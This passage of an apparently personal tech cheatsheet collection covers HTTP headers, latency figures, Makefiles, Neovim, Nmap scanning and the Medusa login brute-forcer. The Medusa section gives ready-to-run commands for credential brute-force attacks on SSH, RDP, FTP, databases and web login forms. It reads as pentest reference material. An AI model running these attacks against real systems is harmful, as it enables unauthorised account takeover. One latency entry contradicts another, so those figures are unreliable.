<ul>
<li>
<p>Partition Tolerance</p>
<ul>
<li>The ability for a system to continue operating even if there is a partition in the network</li>
</ul>
<p><img src="cheatsheets/images/cap_theorem/partition_tolerance.png" alt=""></p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="standard-http-headers"><a class="header" href="#standard-http-headers">standard http headers</a></h1>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Header</th><th>Example</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>A-IM</td><td>A-IM: feed</td><td>Instance manipulations that are acceptable in the response. Defined in RFC 3229</td></tr>
<tr><td>Accept</td><td>Accept: application/json</td><td>The media type/types acceptable</td></tr>
<tr><td>Accept-Charset</td><td>Accept-Charset: utf-8</td><td>The charset acceptable</td></tr>
<tr><td>Accept-Encoding</td><td>Accept-Encoding: gzip, deflate</td><td>List of acceptable encodings</td></tr>
<tr><td>Accept-Language</td><td>Accept-Language: en-US</td><td>List of acceptable languages</td></tr>
<tr><td>Accept-Datetime</td><td>Accept-Datetime: Thu, 31 May 2007 20:35:00 GMT</td><td>Request a past version of the resource prior to the datetime passed</td></tr>
<tr><td>Access-Control-Request-Method</td><td>Access-Control-Request-Method: GET</td><td>Used in a CORS request</td></tr>
<tr><td>Access-Control-Request-Headers</td><td>Access-Control-Request-Headers: origin, x-requested-with, accept</td><td>Used in a CORS request</td></tr>
<tr><td>Authorization</td><td>Authorization: Basic 34i3j4iom2323==</td><td>HTTP basic authentication credentials</td></tr>
<tr><td>Cache-Control</td><td>Cache-Control: no-cache</td><td>Set the caching rules</td></tr>
<tr><td>Connection</td><td>Connection: keep-alive</td><td>Control options for the current connection. Accepts keep-alive and close. Deprecated in HTTP/2</td></tr>
<tr><td>Content-Length</td><td>Content-Length: 348</td><td>The length of the request body in bytes</td></tr>
<tr><td>Content-Type</td><td>Content-Type: application/x-www-form-urlencoded</td><td>The content type of the body of the request (used in POST and PUT requests)</td></tr>
<tr><td>Cookie</td><td>Cookie: name=value</td><td>https://flaviocopes.com/cookies/</td></tr>
<tr><td>Date</td><td>Date: Tue, 15 Nov 1994 08:12:31 GMT</td><td>The date and time that the request was sent</td></tr>
<tr><td>Expect</td><td>Expect: 100-continue</td><td>It‚Äôs typically used when sending a large request body. We expect the server to return back a 100 Continue HTTP status if it can handle the request, or 417 Expectation Failed if not</td></tr>
<tr><td>Forwarded</td><td>Forwarded: for=192.0.2.60; proto=http; by=203.0.113.43</td><td>Disclose original information of a client connecting to a web server through an HTTP proxy. Used for testing purposes only, as it discloses privacy sensitive information</td></tr>
<tr><td>From</td><td>From: user@example.com</td><td>The email address of the user making the request. Meant to be used, for example, to indicate a contact email for bots.</td></tr>
<tr><td>Host</td><td>Host: flaviocopes.com</td><td>The domain name of the server (used to determined the server with virtual hosting), and the TCP port number on which the server is listening. If the port is omitted, 80 is assumed. This is a mandatory HTTP request header</td></tr>
<tr><td>If-Match</td><td>If-Match: ‚Äú737060cd8c284d8582d‚Äù</td><td>Given one (or more) ETags, the server should only send back the response if the current resource matches one of those ETags. Mainly used in PUT methods to update a resource only if it has not been modified since the user last updated it</td></tr>
<tr><td>If-Modified-Since</td><td>If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT</td><td>Allows to return a 304 Not Modified response header if the content is unchanged since that date</td></tr>
<tr><td>If-None-Match</td><td>If-None-Match: ‚Äú737060cd882f209582d‚Äù</td><td>Allows a 304 Not Modified response header to be returned if content is unchanged. Opposite of If-Match.</td></tr>
<tr><td>If-Range</td><td>If-Range: ‚Äú737060cd8c9582d‚Äù</td><td>Used to resume downloads, returns a partial if the condition is matched (ETag or date) or the full resource if not</td></tr>
<tr><td>If-Unmodified-Since</td><td>If-Unmodified-Since: Sat, 29 Oct 1994 19:43:31 GMT</td><td>Only send the response if the entity has not been modified since the specified time</td></tr>
<tr><td>Max-Forwards</td><td>Max-Forwards: 10</td><td>Limit the number of times the message can be forwarded through proxies or gateways</td></tr>
<tr><td>Origin</td><td>Origin: http://mydomain.com</td><td>Send the current domain to perform a CORS request, used in an OPTIONS HTTP request (to ask the server for Access-Control- response headers)</td></tr>
<tr><td>Pragma</td><td>Pragma: no-cache</td><td>Used for backwards compatibility with HTTP/1.0 caches</td></tr>
<tr><td>Proxy-Authorization</td><td>Proxy-Authorization: Basic 2323jiojioIJOIOJIJ==</td><td>Authorization credentials for connecting to a proxy</td></tr>
<tr><td>Range</td><td>Range: bytes=500-999</td><td>Request only a specific part of a resource</td></tr>
<tr><td>Referer</td><td>Referer: https://flaviocopes.com</td><td>The address of the previous web page from which a link to the currently requested page was followed.</td></tr>
<tr><td>TE</td><td>TE: trailers, deflate</td><td>Specify the encodings the client can accept. Accepted values: compress, deflate, gzip, trailers. Only trailers is supported in HTTP/2</td></tr>
<tr><td>User-Agent</td><td>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</td><td>The string that identifies the user agent</td></tr>
<tr><td>Upgrade</td><td>Upgrade: h2c, HTTPS/1.3, IRC/6.9, RTA/x11, websocket</td><td>Ask the server to upgrade to another protocol. Deprecated in HTTP/2</td></tr>
<tr><td>Via</td><td>Via: 1.0 fred, 1.1 example.com (Apache/1.1)</td><td>Informs the server of proxies through which the request was sent</td></tr>
<tr><td>Warning</td><td>Warning: 199 Miscellaneous warning</td><td>A general warning about possible problems with the status of the message. Accepts a special range of values.</td></tr>
<tr><td>Dnt</td><td>DNT: 1</td><td>If enabled, asks servers to not track the user</td></tr>
<tr><td>X-CSRF-Token</td><td>X-CSRF-Token: <token></token></td><td>Used to prevent CSRF</td></tr>
</tbody>
</table>
</div>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="latency-numbers-every-sre-should-know"><a class="header" href="#latency-numbers-every-sre-should-know">Latency Numbers Every SRE Should Know</a></h1>
<p>nanosecond = 1/1,000,000,000 second
microsecond = 1/1,000,000 second
millisecond = 1/1000 second</p>
<h2 id="sub-nanosecond-range"><a class="header" href="#sub-nanosecond-range">Sub-Nanosecond Range</a></h2>
<ul>
<li>Accessing CPU registers</li>
<li>CPU Clock Cycle</li>
</ul>
<h2 id="1-10-nanosecond-range"><a class="header" href="#1-10-nanosecond-range">1-10 Nanosecond Range</a></h2>
<ul>
<li>L1/L2 cache</li>
<li>Branch Misprediction in CPU pipelining</li>
</ul>
<h2 id="10-100-nanosecond-range"><a class="header" href="#10-100-nanosecond-range">10-100 Nanosecond Range</a></h2>
<ul>
<li>L3 cache</li>
<li>Apple M1 referencing main memory (RAM)</li>
</ul>
<h2 id="100-1000-nanosecond-range"><a class="header" href="#100-1000-nanosecond-range">100-1000 Nanosecond Range</a></h2>
<ul>
<li>System call on Linux</li>
<li>MD5 hash a 64-bit number</li>
</ul>
<h2 id="1-10-microsecond-range"><a class="header" href="#1-10-microsecond-range">1-10 Microsecond Range</a></h2>
<ul>
<li>Context switching between Linux threads</li>
</ul>
<h2 id="10-100-microsecond-range"><a class="header" href="#10-100-microsecond-range">10-100 Microsecond Range</a></h2>
<ul>
<li>Process a HTTP request</li>
<li>Reading 1 megabyte of sequential data from RAM</li>
<li>Read an 8k page from an ssd</li>
</ul>
<h2 id="100-1000-microsecond-range"><a class="header" href="#100-1000-microsecond-range">100-1000 Microsecond Range</a></h2>
<ul>
<li>SSD write Latency</li>
<li>Intra-zone networking round trip in most cloud providers</li>
<li>Memcache/Redis get operation</li>
</ul>
<h2 id="1-10-millisecond-range"><a class="header" href="#1-10-millisecond-range">1-10 Millisecond Range</a></h2>
<ul>
<li>Inter-zone networking Latency</li>
<li>Seek time of a HDD</li>
</ul>
<h2 id="10-100-millisecond-range"><a class="header" href="#10-100-millisecond-range">10-100 Millisecond Range</a></h2>
<ul>
<li>Network round trip between US-west and US-east coast</li>
<li>Read 1 megabyte sequentially from main memory</li>
</ul>
<h2 id="100-1000-millisecond-range"><a class="header" href="#100-1000-millisecond-range">100-1000 Millisecond Range</a></h2>
<ul>
<li>Some encryption/hashing algorithms</li>
<li>TLS handshake</li>
<li>Read 1 Gigabyte sequentially from an SSD</li>
</ul>
<h2 id="1-second"><a class="header" href="#1-second">1 second+</a></h2>
<ul>
<li>Transfer 1GB over a cloud network within the same region</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="make-files"><a class="header" href="#make-files">Make Files</a></h1>
<h2 id="why-do-make-files-exist"><a class="header" href="#why-do-make-files-exist">Why do Make files exist?</a></h2>
<p>Make files are used for automation. Typically as a step in the software development lifecycle (compilation, builds, etc.). However, they can be used for any other task that can be automated via the shell.</p>
<p><strong>Make files must be indented using tabs, not spaces</strong></p>
<h2 id="makefile-syntax"><a class="header" href="#makefile-syntax">Makefile Syntax</a></h2>
<p>Makefiles consist of a set of rules. Rules typically look like this:</p>
<pre><code>targets: prerequisites
	command
	command
	command
</code></pre>
<ul>
<li>The targets are file names, separated by spaces. Typically, there is only 1 per rule.</li>
<li>The commands are a series of steps typically used to make targets.</li>
<li>The prerequisites are also file names, separated by spaces. These files need to exist before the commands for the target are run. These are dependencies to the targets.</li>
</ul>
<h2 id="example"><a class="header" href="#example">Example</a></h2>
<p>Let‚Äôs start with a hello world example:</p>
<pre><code>hello:
	echo "Hello, World"
	echo "This line will print if the file hello does not exist."
</code></pre>
<p>There‚Äôs already a lot to take in here. Let‚Äôs break it down:</p>
<ul>
<li>We have one target called hello</li>
<li>This target has two commands</li>
<li>This target has no prerequisites</li>
</ul>
<p>We‚Äôll then run make hello. As long as the hello file does not exist, the commands will run. If hello does exist, no commands will run. It‚Äôs important to realize that I‚Äôm talking about hello as both a target and a file. That‚Äôs because the two are directly tied together. Typically, when a target is run (aka when the commands of a target are run), the commands will create a file with the same name as the target. In this case, the hello target does not create the hello file.</p>
<p>Let‚Äôs create a more typical Makefile - one that compiles a single C file. But before we do, make a file called blah.c that has the following contents:</p>
<pre><code>// blah.c
int main() { return 0; }
</code></pre>
<p>Then create the Makefile (called Makefile, as always):</p>
<pre><code>blah:
	cc blah.c -o blah
</code></pre>
<p>This time, try simply running make. Since there‚Äôs no target supplied as an argument to the make command, the first target is run. In this case, there‚Äôs only one target (blah). The first time you run this, blah will be created. The second time, you‚Äôll see make: ‚Äòblah‚Äô is up to date. That‚Äôs because the blah file already exists. But there‚Äôs a problem: if we modify blah.c and then run make, nothing gets recompiled.</p>
<p>We solve this by adding a prerequisite:</p>
<pre><code>blah: blah.c
	cc blah.c -o blah
</code></pre>
<p>When we run make again, the following set of steps happens:</p>
<ul>
<li>The first target is selected, because the first target is the default target</li>
<li>This has a prerequisite of blah.c</li>
<li>Make decides if it should run the blah target. It will only run if blah doesn‚Äôt exist, or blah.c is newer than blah</li>
</ul>
<p>This last step is critical, and is the essence of make. What it‚Äôs attempting to do is decide if the prerequisites of blah have changed since blah was last compiled. That is, if blah.c is modified, running make should recompile the file. And conversely, if blah.c has not changed, then it should not be recompiled.</p>
<p>To make this happen, it uses the filesystem timestamps as a proxy to determine if something has changed. This is a reasonable heuristic, because file timestamps typically will only change if the files are modified. But it‚Äôs important to realize that this isn‚Äôt always the case. You could, for example, modify a file, and then change the modified timestamp of that file to something old. If you did, Make would incorrectly guess that the file hadn‚Äôt changed and thus could be ignored.</p>
<h2 id="make-clean"><a class="header" href="#make-clean">Make Clean</a></h2>
<p>clean is often used as a target that removes the output of other targets, but it is not a special word in Make. You can run make and make clean on this to create and delete some_file.</p>
<p>Note that clean is doing two new things here:</p>
<ul>
<li>It‚Äôs a target that is not first (the default), and not a prerequisite. That means it‚Äôll never run unless you explicitly call make clean</li>
<li>It‚Äôs not intended to be a filename. If you happen to have a file named clean, this target won‚Äôt run, which is not what we want. See .PHONY later in this tutorial on how to fix this</li>
</ul>
<pre><code>some_file: 
	touch some_file

clean:
	rm -f some_file
</code></pre>
<h2 id="variables"><a class="header" href="#variables">Variables</a></h2>
<p>Variables can only be strings. You‚Äôll typically want to use :=, but = also works.</p>
<p>Here‚Äôs an example of using variables:</p>
<pre><code>files := file1 file2
some_file: $(files)
	echo "Look at this variable: " $(files)
	touch some_file

file1:
	touch file1
file2:
	touch file2

clean:
	rm -f file1 file2 some_file
</code></pre>
<h1 id="targets"><a class="header" href="#targets">targets</a></h1>
<h2 id="the-all-target"><a class="header" href="#the-all-target">The ‚Äòall‚Äô target</a></h2>
<p>Making multiple targets and you want all of them to run? Make an all target. Since this is the first rule listed, it will run by default if make is called without specifying a target.</p>
<pre><code>all: one two three

one:
	touch one
two:
	touch two
three:
	touch three

clean:
	rm -f one two three
</code></pre>
<h2 id="multiple-targets"><a class="header" href="#multiple-targets">Multiple targets</a></h2>
<p>When there are multiple targets for a rule, the commands will be run for each target. <code>$@</code> is an automatic variable that contains the target name.</p>
<pre><code>all: f1.o f2.o

f1.o f2.o:
	echo $@
# Equivalent to:
# f1.o:
#	 echo f1.o
# f2.o:
#	 echo f2.o
</code></pre>
<h1 id="reference"><a class="header" href="#reference">Reference</a></h1>
<h3 id="var-assignment"><a class="header" href="#var-assignment">Var assignment</a></h3>
<pre><code class="language-makefile">foo  = "bar"
bar  = $(foo) foo  # dynamic (renewing) assignment
foo := "boo"       # one time assignment, $(bar) now is "boo foo"
foo ?= /usr/local  # safe assignment, $(foo) and $(bar) still the same
bar += world       # append, "boo foo world"
foo != echo fooo   # exec shell command and assign to foo
# $(bar) now is "fooo foo world"
</code></pre>
<p><code>=</code> expressions are only evaluated when they‚Äôre being used.</p>
<h3 id="magic-variables"><a class="header" href="#magic-variables">Magic variables</a></h3>
<pre><code class="language-makefile">out.o: src.c src.h
  $@   # "out.o" (target)
  $&lt;   # "src.c" (first prerequisite)
  $^   # "src.c src.h" (all prerequisites)

%.o: %.c
  $*   # the 'stem' with which an implicit rule matches ("foo" in "foo.c")

also:
  $+   # prerequisites (all, with duplication)
  $?   # prerequisites (new ones)
  $|   # prerequisites (order-only?)

  $(@D) # target directory
</code></pre>
<h3 id="command-prefixes"><a class="header" href="#command-prefixes">Command prefixes</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Prefix</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-</code></td><td>Ignore errors</td></tr>
<tr><td><code>@</code></td><td>Don‚Äôt print command</td></tr>
<tr><td><code>+</code></td><td>Run even if Make is in ‚Äòdon‚Äôt execute‚Äô mode</td></tr>
</tbody>
</table>
</div>
<pre><code class="language-makefile">build:
    @echo "compiling"
    -gcc $&lt; $@

-include .depend
</code></pre>
<h3 id="find-files"><a class="header" href="#find-files">Find files</a></h3>
<pre><code class="language-makefile">js_files  := $(wildcard test/*.js)
all_files := $(shell find images -name "*")
</code></pre>
<h3 id="substitutions"><a class="header" href="#substitutions">Substitutions</a></h3>
<pre><code class="language-makefile">file     = $(SOURCE:.cpp=.o)   # foo.cpp =&gt; foo.o
outputs  = $(files:src/%.coffee=lib/%.js)

outputs  = $(patsubst %.c, %.o, $(wildcard *.c))
assets   = $(patsubst images/%, assets/%, $(wildcard images/*))
</code></pre>
<h3 id="more-functions"><a class="header" href="#more-functions">More functions</a></h3>
<pre><code class="language-makefile">$(strip $(string_var))

$(filter %.less, $(files))
$(filter-out %.less, $(files))
</code></pre>
<h3 id="building-files"><a class="header" href="#building-files">Building files</a></h3>
<pre><code class="language-makefile">%.o: %.c
  ffmpeg -i $&lt; &gt; $@   # Input and output
  foo $^
</code></pre>
<h3 id="includes"><a class="header" href="#includes">Includes</a></h3>
<pre><code class="language-makefile">-include foo.make
</code></pre>
<h3 id="options"><a class="header" href="#options">Options</a></h3>
<pre><code class="language-sh">make
  -e, --environment-overrides
  -B, --always-make
  -s, --silent
  -j, --jobs=N   # parallel processing
</code></pre>
<h3 id="conditionals"><a class="header" href="#conditionals">Conditionals</a></h3>
<pre><code class="language-makefile">foo: $(objects)
ifeq ($(CC),gcc)
  $(CC) -o foo $(objects) $(libs_for_gcc)
else
  $(CC) -o foo $(objects) $(normal_libs)
endif
</code></pre>
<h3 id="recursive"><a class="header" href="#recursive">Recursive</a></h3>
<pre><code class="language-makefile">deploy:
  $(MAKE) deploy2
</code></pre>
<h3 id="further-reading"><a class="header" href="#further-reading">Further reading</a></h3>
<ul>
<li><a href="https://gist.github.com/isaacs/62a2d1825d04437c6f08">isaacs‚Äôs Makefile</a></li>
<li><a href="https://tech.davis-hansson.com/p/make/">Your Makefiles are wrong</a></li>
<li><a href="https://www.gnu.org/software/make/manual/html_node/index.html">Manual</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="neovim-cheatsheet"><a class="header" href="#neovim-cheatsheet">Neovim Cheatsheet</a></h1>
<h2 id="mode-switching"><a class="header" href="#mode-switching">Mode Switching:</a></h2>
<ul>
<li>i: Insert mode before cursor</li>
<li>I: Insert mode at the beginning of line</li>
<li>a: Insert mode after cursor</li>
<li>A: Insert mode at the end of line</li>
<li>v: Visual mode</li>
<li>V: Visual line mode</li>
<li>^V (Ctrl + V): Visual block mode</li>
<li>:q: Quit (add ! to force)</li>
<li>:w: Save/write</li>
<li>:wq or ZZ: Save and Quit</li>
</ul>
<h2 id="cursor-movement"><a class="header" href="#cursor-movement">Cursor Movement:</a></h2>
<ul>
<li>h: Left</li>
<li>j: Down</li>
<li>k: Up</li>
<li>l: Right</li>
<li>w: Jump by start of words</li>
<li>e: Jump to end of words</li>
<li>b: Jump backward by words</li>
<li>0: Start of line</li>
<li>$: End of line</li>
<li>G: Go to last line of document</li>
<li>gg: Go to first line of document</li>
<li>^: First non-blank character of line</li>
<li>: followed by a number: Go to that line number (e.g., :10)</li>
</ul>
<h2 id="editing"><a class="header" href="#editing">Editing:</a></h2>
<ul>
<li>u: Undo</li>
<li>^R (Ctrl + R): Redo</li>
<li>yy or Y: Yank/copy line</li>
<li>dd: Delete line</li>
<li>D: Delete from cursor to end of line</li>
<li>x: Delete character under cursor</li>
<li>p: Paste after cursor</li>
<li>P: Paste before cursor</li>
<li>r followed by a character: Replace character under cursor with the new character</li>
<li>cw: Change word</li>
</ul>
<h2 id="search-and-replace"><a class="header" href="#search-and-replace">Search and Replace:</a></h2>
<ul>
<li>/ followed by a term: Search for term (press n to go to next and N for previous)</li>
<li>:%s/old/new/g: Replace all occurrences of ‚Äúold‚Äù with ‚Äúnew‚Äù in the entire file</li>
</ul>
<h2 id="windows--tabs"><a class="header" href="#windows--tabs">Windows &amp; Tabs:</a></h2>
<ul>
<li>^W (Ctrl + W) followed by h/j/k/l: Move cursor to another window</li>
<li>:split or :sp: Split window horizontally</li>
<li>:vsplit or :vsp: Split window vertically</li>
<li>:tabnew or :tabn: Create a new tab</li>
<li>gt: Move to next tab</li>
<li>gT: Move to previous tab</li>
</ul>
<h2 id="others"><a class="header" href="#others">Others:</a></h2>
<ul>
<li>.: Repeat last command</li>
<li>*: Search for word under cursor</li>
<li>#: Search for word under cursor, backwards</li>
<li>~: Switch case of character under cursor</li>
<li>o: Insert new line below and enter insert mode</li>
<li>O: Insert new line above and enter insert mode</li>
<li>
<blockquote>
<blockquote>
<p>: Indent line</p>
</blockquote>
</blockquote>
</li>
<li>&lt;&lt;: Dedent line</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="nmap-cheatsheet"><a class="header" href="#nmap-cheatsheet">Nmap Cheatsheet</a></h1>
<h2 id="basic-scan-types"><a class="header" href="#basic-scan-types">Basic Scan Types</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Scan</th><th>Command</th><th>Purpose</th></tr>
</thead>
<tbody>
<tr><td><strong>Ping Scan</strong></td><td><code>nmap -sn &lt;target&gt;</code></td><td>Check if host is up.</td></tr>
<tr><td><strong>SYN Scan</strong></td><td><code>nmap -sS &lt;target&gt;</code></td><td>Stealthy fast TCP scan.</td></tr>
<tr><td><strong>Service Version Scan</strong></td><td><code>nmap -sV &lt;target&gt;</code></td><td>Scan service version of open ports.</td></tr>
<tr><td><strong>Connect Scan</strong></td><td><code>nmap -sT &lt;target&gt;</code></td><td>Full TCP handshake; accurate but noisy.</td></tr>
<tr><td><strong>UDP Scan</strong></td><td><code>nmap -sU &lt;target&gt;</code></td><td>Scan UDP ports (slow).</td></tr>
<tr><td><strong>Version Scan</strong></td><td><code>nmap -sV &lt;target&gt;</code></td><td>Identify service versions.</td></tr>
<tr><td><strong>OS Detection</strong></td><td><code>nmap -O &lt;target&gt;</code></td><td>Guess OS.</td></tr>
<tr><td><strong>Aggressive Scan</strong></td><td><code>nmap -A &lt;target&gt;</code></td><td>OS, version, scripts, traceroute.</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="port-selection"><a class="header" href="#port-selection">Port Selection</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Meaning</th></tr>
</thead>
<tbody>
<tr><td><code>-p 22</code></td><td>Scan one port</td></tr>
<tr><td><code>-p 22,80,443</code></td><td>Scan list</td></tr>
<tr><td><code>-p 1-65535</code></td><td>Scan range</td></tr>
<tr><td><code>-p-</code></td><td>Scan all ports</td></tr>
<tr><td><code>--top-ports=10</code></td><td>Scan most common ports</td></tr>
<tr><td><code>-F</code></td><td>Fast scan (top 100)</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="important-flags"><a class="header" href="#important-flags">Important Flags</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Flag</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-Pn</code></td><td>No host discovery; treat host as up</td></tr>
<tr><td><code>-n</code></td><td>No DNS resolution</td></tr>
<tr><td><code>--disable-arp-ping</code></td><td>Disable ARP ping</td></tr>
<tr><td><code>--packet-trace</code></td><td>Show all sent/received packets</td></tr>
<tr><td><code>--reason</code></td><td>Explain port states</td></tr>
<tr><td><code>-T4</code></td><td>Faster timing template</td></tr>
<tr><td><code>--stats-every=5s	</code></td><td>Show stats every 5 seconds</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="port-states"><a class="header" href="#port-states">Port States</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>State</th><th>Meaning</th></tr>
</thead>
<tbody>
<tr><td><strong>open</strong></td><td>Accepts connections</td></tr>
<tr><td><strong>closed</strong></td><td>Responds with RST</td></tr>
<tr><td><strong>filtered</strong></td><td>Blocked by firewall</td></tr>
<tr><td><strong>unfiltered</strong></td><td>Reachable, state unknown</td></tr>
<tr><td><strong>open|filtered</strong></td><td>No response</td></tr>
<tr><td><strong>closed|filtered</strong></td><td>Idle scan ambiguity</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="useful-examples"><a class="header" href="#useful-examples">Useful Examples</a></h2>
<h3 id="scan-top-10-tcp-ports"><a class="header" href="#scan-top-10-tcp-ports">Scan Top 10 TCP Ports</a></h3>
<pre><code>nmap --top-ports=10 &lt;target&gt;
</code></pre>
<h3 id="full-tcp--udp--version--os"><a class="header" href="#full-tcp--udp--version--os">Full TCP + UDP + Version + OS</a></h3>
<pre><code>nmap -sS -sU -sV -O &lt;target&gt;
</code></pre>
<h3 id="packet-trace-example"><a class="header" href="#packet-trace-example">Packet Trace Example</a></h3>
<pre><code>nmap -p 21 --packet-trace -Pn -n --disable-arp-ping &lt;target&gt;
</code></pre>
<h3 id="service-enumeration"><a class="header" href="#service-enumeration">Service Enumeration</a></h3>
<pre><code>nmap -sV -p &lt;port&gt; &lt;target&gt;
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="medusa-cheatsheet"><a class="header" href="#medusa-cheatsheet">Medusa Cheatsheet</a></h1>
<p>Medusa is a fast, massively parallel, and modular login brute-forcer designed to support a wide array of services that allow remote authentication.</p>
<h2 id="installation"><a class="header" href="#installation">Installation</a></h2>
<pre><code class="language-bash">sudo apt-get -y update
sudo apt-get -y install medusa
</code></pre>
<h2 id="command-syntax"><a class="header" href="#command-syntax">Command Syntax</a></h2>
<pre><code class="language-bash">medusa [target_options] [credential_options] -M module [module_options]
</code></pre>
<h2 id="parameters"><a class="header" href="#parameters">Parameters</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Parameter</th><th>Explanation</th><th>Usage Example</th></tr>
</thead>
<tbody>
<tr><td><code>-h HOST</code></td><td>Target: Single hostname or IP address</td><td><code>medusa -h 192.168.1.10 ...</code></td></tr>
<tr><td><code>-H FILE</code></td><td>Target: File containing list of targets</td><td><code>medusa -H targets.txt ...</code></td></tr>
<tr><td><code>-u USERNAME</code></td><td>Username: Single username</td><td><code>medusa -u admin ...</code></td></tr>
<tr><td><code>-U FILE</code></td><td>Username: File containing usernames</td><td><code>medusa -U usernames.txt ...</code></td></tr>
<tr><td><code>-p PASSWORD</code></td><td>Password: Single password</td><td><code>medusa -p password123 ...</code></td></tr>
<tr><td><code>-P FILE</code></td><td>Password: File containing passwords</td><td><code>medusa -P passwords.txt ...</code></td></tr>
<tr><td><code>-M MODULE</code></td><td>Module: Specific module to use</td><td><code>medusa -M ssh ...</code></td></tr>
<tr><td><code>-m "OPTION"</code></td><td>Module options: Additional parameters for module</td><td><code>medusa -M http -m "POST /login.php..."</code></td></tr>
<tr><td><code>-t TASKS</code></td><td>Tasks: Number of parallel login attempts</td><td><code>medusa -t 4 ...</code></td></tr>
<tr><td><code>-f</code></td><td>Fast mode: Stop after first success on current host</td><td><code>medusa -f ...</code></td></tr>
<tr><td><code>-F</code></td><td>Fast mode: Stop after first success on any host</td><td><code>medusa -F ...</code></td></tr>
<tr><td><code>-n PORT</code></td><td>Port: Specify non-default port</td><td><code>medusa -n 2222 ...</code></td></tr>
<tr><td><code>-v LEVEL</code></td><td>Verbose: Detailed output (0-6)</td><td><code>medusa -v 4 ...</code></td></tr>
<tr><td><code>-e ns</code></td><td>Empty/Default: Check empty (n) and same as username (s)</td><td><code>medusa -e ns ...</code></td></tr>
</tbody>
</table>
</div>
<h2 id="modules"><a class="header" href="#modules">Modules</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Module</th><th>Service/Protocol</th><th>Description</th><th>Usage Example</th></tr>
</thead>
<tbody>
<tr><td><code>ftp</code></td><td>File Transfer Protocol</td><td>Brute-force FTP login credentials</td><td><code>medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr>
<tr><td><code>http</code></td><td>Hypertext Transfer Protocol</td><td>Brute-force HTTP login forms (GET/POST)</td><td><code>medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&amp;password=^PASS^</code></td></tr>
<tr><td><code>imap</code></td><td>Internet Message Access Protocol</td><td>Brute-force IMAP logins for email servers</td><td><code>medusa -M imap -h mail.example.com -U users.txt -P passwords.txt</code></td></tr>
<tr><td><code>mysql</code></td><td>MySQL Database</td><td>Brute-force MySQL database credentials</td><td><code>medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt</code></td></tr>
<tr><td><code>pop3</code></td><td>Post Office Protocol 3</td><td>Brute-force POP3 logins for email retrieval</td><td><code>medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt</code></td></tr>
<tr><td><code>rdp</code></td><td>Remote Desktop Protocol</td><td>Brute-force RDP logins for Windows remote desktop</td><td><code>medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr>
<tr><td><code>ssh</code></td><td>Secure Shell (SSH)</td><td>Brute-force SSH logins for secure remote access</td><td><code>medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt</code></td></tr>
<tr><td><code>svn</code></td><td>Subversion (SVN)</td><td>Brute-force Subversion repositories</td><td><code>medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr>
<tr><td><code>telnet</code></td><td>Telnet Protocol</td><td>Brute-force Telnet services</td><td><code>medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr>
<tr><td><code>vnc</code></td><td>Virtual Network Computing</td><td>Brute-force VNC login credentials</td><td><code>medusa -M vnc -h 192.168.1.100 -P passwords.txt</code></td></tr>
<tr><td><code>web-form</code></td><td>Web Login Forms</td><td>Brute-force login forms using HTTP POST</td><td><code>medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&amp;password=^PASS^:F=Invalid"</code></td></tr>
</tbody>
</table>
</div>
<h2 id="useful-examples-1"><a class="header" href="#useful-examples-1">Useful Examples</a></h2>
<h3 id="ssh-brute-force-attack"><a class="header" href="#ssh-brute-force-attack">SSH Brute-Force Attack</a></h3>
<pre><code class="language-bash">medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh
</code></pre>
<h3 id="multiple-web-servers-with-basic-http-authentication"><a class="header" href="#multiple-web-servers-with-basic-http-authentication">Multiple Web Servers with Basic HTTP Authentication</a></h3>
<pre><code class="language-bash">medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
</code></pre>
<h3 id="test-for-empty-or-default-passwords"><a class="header" href="#test-for-empty-or-default-passwords">Test for Empty or Default Passwords</a></h3>
<pre><code class="language-bash">medusa -h 10.0.0.5 -U usernames.txt -e ns -M ssh
</code></pre>
<h3 id="http-post-form-attack"><a class="header" href="#http-post-form-attack">HTTP POST Form Attack</a></h3>
<pre><code class="language-bash">medusa -M http -h www.example.com -U users.txt -P passwords.txt -m "POST /login.php HTTP/1.1\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=^USER^&amp;password=^PASS^"
</code></pre>
<h3 id="fast-mode-stop-on-first-success"><a class="header" href="#fast-mode-stop-on-first-success">Fast Mode (Stop on First Success)</a></h3>
<pre><code class="language-bash">medusa -h 192.168.1.100 -U usernames.txt -P passwords.txt -M ssh -f
</code></pre>
<h3 id="custom-port-ssh-attack"><a class="header" href="#custom-port-ssh-attack">Custom Port SSH Attack</a></h3>
